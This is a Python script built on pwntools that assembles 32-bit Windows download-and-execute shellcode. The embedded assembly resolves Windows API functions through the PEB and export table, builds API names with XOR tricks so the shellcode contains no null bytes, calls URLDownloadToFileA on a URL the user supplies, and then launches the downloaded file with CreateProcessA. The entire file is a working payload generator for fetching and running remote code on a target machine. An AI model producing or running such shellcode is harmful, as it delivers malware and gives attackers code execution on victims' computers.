#!/usr/bin/env python3
from pwn import *
import re
import argparse
from math import ceil
parser = argparse.ArgumentParser(description='Generate x86 windows download-execute shellcode')
parser.add_argument('-u', '--url', type=str, required=True, help='URL to file to download')
parser.add_argument('-n', '--filename', type=str, required=True, help='Name of the file to be downloaded')
parser.add_argument('-o', '--output', type=argparse.FileType('wb'), required=False, help='Output shellcode file')

args = parser.parse_args()
n = ceil((len(args.url)+1)/4)*4 + ceil((len(args.filename)+1)/4)*4

code = f'''
push ebp
mov ebp, esp
sub esp, 0x30

mov eax, [fs:0x30]; PEB
mov eax, [eax+0xc]; LDR
mov eax, [eax+0x14] ;InMemoryOrderList
mov eax, [eax]
mov eax, [eax]
mov eax, [eax+0x10]; kernel32.dll base address
mov [ebp-4], eax; var4 = kernel32 base addr
mov eax, [eax+0x3c]
add eax, [ebp-4]; e_lfanew
mov eax, [eax+0x78]
add eax, [ebp-4]; data dir
mov [ebp-8], eax; var8 = data dir
mov eax, [eax+0x20]
add eax, [ebp-4]
mov [ebp-12], eax; var12 = name table
mov eax, [ebp-8]
mov eax, [eax+0x24]
add eax, [ebp-4]
mov [ebp-16], eax; var16 = ordinal table
mov eax, [ebp-8]
mov eax, [eax+0x1c]
add eax, [ebp-4]
mov [ebp-8], eax; var8 = addr table

/* push GetProcAddress*/
push 0x1010101
xor dword ptr [esp], 0x1017272
push 0x65726464
push 0x41636f72
push 0x50746547

mov [ebp-20], esp; var20 = GetProcAddress

xor eax, eax
xor ecx, ecx
xor ebx, ebx
.lp1:
	mov edi, [ebp-20]
	mov esi, [ebp-12]
	mov esi, [esi+4*ebx]
	add esi, [ebp-4]
		.lp2:
			lodsb
			test eax, eax
			jz .found
			scasb
			je .eq
			inc ebx
			jmp .lp1
			.eq:
			jmp .lp2


.found:
mov eax, ebx
mov [ebp-20], eax; ordinal
add esp, 16
mov eax, [ebp-16]
xor ecx, ecx
mov cx, [eax+2*ebx]
mov eax, [ebp-8]
mov eax, [eax+4*ecx]
add eax, [ebp-4]
mov [ebp-8], eax; var8 = GetProcAddr

;/* push b'LoadLibraryA\x00' */
push 1
dec byte ptr [esp]
push 0x41797261
push 0x7262694c
push 0x64616f4c

push esp
mov eax, [ebp-4]
push eax
mov eax,[ebp-8]
call eax
mov [ebp-12], eax; var12 = LoadLibraryA
add esp, 16

;/* push b'Urlmon.dll\x00' */
push 0x1010101
xor dword ptr [esp], 0x1016d6d
push 0x642e6e6f
push 0x6d6c7255

push esp
mov eax, [ebp-12]
call eax
mov [ebp-16], eax; var16 = Urlmon.dll
add esp, 12

;/* push b'URLDownloadToFileA\x00' */
push 0x1010101
xor dword ptr [esp], 0x1014064
push 0x6c69466f
push 0x5464616f
push 0x6c6e776f
push 0x444c5255

push esp
mov eax, [ebp-16]
push eax
mov eax,[ebp-8]
call eax
mov [ebp-20], eax; var20 = UrlDownloadToFile
add esp, 20

{shellcraft.pushstr(args.url)}

mov [ebp-24], esp; var24 = URL

{shellcraft.pushstr(args.filename)}
mov [ebp-28], esp; var28 = filename

xor eax, eax
push eax
push eax
mov ebx, [ebp-28]
push ebx
mov ebx, [ebp-24]
push ebx
push eax
mov eax, [ebp-20]
call eax
add esp, {n}

    /* push b'CreateProcessA\x00' */
    push 0x1010101
    xor dword ptr [esp], 0x1014072
    push 0x7365636f
    push 0x72506574
    push 0x61657243



push esp
mov eax, [ebp-4]
push eax
mov eax, [ebp-8]
call eax
mov [ebp-32], eax; var32 = CreateProcessA
add esp, 16



{shellcraft.pushstr(args.filename)}
mov [ebp-36], esp; var36=fn

mov ebx, [ebp-32]



xor eax, eax
push eax
push eax
push eax
push eax
push eax
push eax
push eax
push eax
push eax
push eax
push eax
push eax
push eax
push eax
push eax
push eax
push eax
mov ecx, esp
; ecx = si
movb [ecx], 0x44
push eax
push eax
push eax
push eax
mov edx, esp

push edx
push ecx
push eax
push eax
push eax
push eax
push eax
push eax
push eax
mov eax, [ebp-36]
push eax
call ebx




add esp, 0x54
add esp, {ceil((len(args.filename)+1)/4)*4}
add esp, 0x30

pop ebp
ret
'''
code = re.sub(';.*\n', '\n', code)

context.update(arch='i686', bits=32)
sc = asm(code)
if args.output == None:
	print(sc)
else:
	args.output.write(sc)